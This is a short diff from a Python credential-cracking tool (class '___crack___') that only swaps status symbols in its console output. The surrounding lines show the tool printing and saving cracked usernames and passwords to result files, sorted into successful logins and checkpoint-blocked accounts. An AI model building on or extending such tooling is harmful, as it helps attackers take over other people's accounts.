@@ -444,10 +444,10 @@ class ___crack___:
                             following = ('-')
                         except:pass
                         print(f"\r{A}║ [{H}✔{A}]{A} Status {A}:{H} SUCCESS LOGIN")
-                        print(f"{A}║ [{H}>{A}]{A} Username {A}:{H} {uid}")
-                        print(f"{A}║ [{H}>{A}]{A} Password {A}:{H} {pw}")
-                        print(f"{A}║ [{H}>{A}]{A} Follower {A}:{H} {follower}")
-                        print(f"{A}║ [{H}>{A}]{A} Following {A}:{H} {following}")
+                        print(f"{A}║ [{H}☑{A}]{A} Username {A}:{H} {uid}")
+                        print(f"{A}║ [{H}☑{A}]{A} Password {A}:{H} {pw}")
+                        print(f"{A}║ [{H}☑{A}]{A} Follower {A}:{H} {follower}")
+                        print(f"{A}║ [{H}☑{A}]{A} Following {A}:{H} {following}")
                         self.ok.append(f"{uid}|{pw}")
                         open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                         break
@@ -461,10 +461,10 @@ class ___crack___:
                             following = ('-')
                         except:pass
                         print(f"\r{A}║ [{M}✘{A}]{A} Status {A}:{J} CHECKPOINT LOGIN")
-                        print(f"{A}║ [{J}>{A}]{A} Username {A}:{J} {uid}")
-                        print(f"{A}║ [{J}>{A}]{A} Password {A}:{J} {pw}")
-                        print(f"{A}║ [{J}>{A}]{A} Follower {A}:{J} {follower}")
-                        print(f"{A}║ [{J}>{A}]{A} Following {A}:{J} {following}\n")
+                        print(f"{A}║ [{J}☒{A}]{A} Username {A}:{J} {uid}")
+                        print(f"{A}║ [{J}☒{A}]{A} Password {A}:{J} {pw}")
+                        print(f"{A}║ [{J}☒{A}]{A} Follower {A}:{J} {follower}")
+                        print(f"{A}║ [{J}☒{A}]{A} Following {A}:{J} {following}\n")
                         self.cp.append(f"{uid}|{pw}")
                         open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                         break
